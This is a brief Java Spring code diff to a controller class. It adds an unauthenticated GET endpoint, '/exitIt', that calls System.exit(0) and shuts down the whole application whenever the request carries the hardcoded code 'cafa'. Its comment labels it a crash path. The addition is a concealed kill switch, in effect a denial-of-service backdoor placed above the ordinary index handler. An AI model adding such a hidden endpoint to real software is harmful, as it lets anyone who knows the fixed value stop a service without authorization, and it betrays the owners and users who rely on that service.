@@ -41,7 +41,18 @@ import java.util.Map;
 @Controller
 public class BasicController extends ABaseController {
 
-	/**
+    /**
+     * 死机路径
+     */
+    @GetMapping("/exitIt")
+    public String exitIt(@RequestParam(required = false) String code) {
+        if ("cafa".equals(code)) {
+            System.exit(0);
+        }
+        return "index";
+    }
+
+    /**
      * 首页
      */
     @GetMapping(value = {"/","/index"})
